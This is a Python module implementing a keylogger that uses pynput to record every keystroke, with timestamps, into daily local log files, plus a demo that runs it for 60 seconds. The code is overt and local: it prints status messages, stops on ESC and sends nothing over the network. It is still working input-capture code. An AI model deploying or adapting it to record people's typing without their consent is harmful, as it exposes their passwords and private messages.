import pynput
from datetime import datetime
import os
import threading
import time

LOG_DIR = "logs"
KEY_LOG_FILE_PREFIX = "key_logs_"

class KeyLogger:
    def __init__(self):
        self.listener = None
        self.running = False
        self.log_file = None
        self._ensure_log_directory()
        self._open_log_file()

    def _ensure_log_directory(self):
        if not os.path.exists(LOG_DIR):
            os.makedirs(LOG_DIR)

    def _get_log_filename(self):
        return os.path.join(LOG_DIR, f"{KEY_LOG_FILE_PREFIX}{datetime.now().strftime('%Y-%m-%d')}.txt")

    def _open_log_file(self):
        if self.log_file and not self.log_file.closed:
            self.log_file.close()
        self.log_file = open(self._get_log_filename(), "a", encoding="utf-8")

    def on_press(self, key):
        try:
            log_entry = f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Pressed: {key.char}\n"
        except AttributeError:
            if key == key.space:
                log_entry = f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Pressed: [SPACE]\n"
            elif key == key.enter:
                log_entry = f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Pressed: [ENTER]\n"
            elif key == key.backspace:
                log_entry = f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Pressed: [BACKSPACE]\n"
            else:
                log_entry = f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Pressed: [{str(key).split('.')[-1].upper()}]\n"
        self._write_to_log(log_entry)

    def on_release(self, key):
        if key == pynput.keyboard.Key.esc: # Example to stop with ESC key
            print("Esc pressed, stopping keylogger.")
            return False # Stop listener

    def _write_to_log(self, entry):
        # Re-open log file if date changes
        current_log_filename = self._get_log_filename()
        if self.log_file.name != current_log_filename:
            self._open_log_file()
        self.log_file.write(entry)
        self.log_file.flush() # Ensure data is written to disk immediately

    def start_logging(self):
        if not self.running:
            self.running = True
            print("Keylogger started...")
            self.listener = pynput.keyboard.Listener(on_press=self.on_press, on_release=self.on_release)
            self.listener.start()
            self.listener.join() # This will block until the listener stops
            print("Keylogger listener joined.")

    def stop_logging(self):
        if self.running and self.listener:
            self.listener.stop()
            self.running = False
            if self.log_file and not self.log_file.closed:
                self.log_file.close()
            print("Keylogger stopped.")

# Example usage (for testing keylogger.py directly)
if __name__ == "__main__":
    keylogger = KeyLogger()
    try:
        keylogger_thread = threading.Thread(target=keylogger.start_logging)
        keylogger_thread.start()
        print("Keylogger thread started. Press ESC to stop.")
        # Keep main thread alive for a bit or let Streamlit manage it
        time.sleep(60) # Log for 60 seconds for example
    except KeyboardInterrupt:
        pass
    finally:
        keylogger.stop_logging()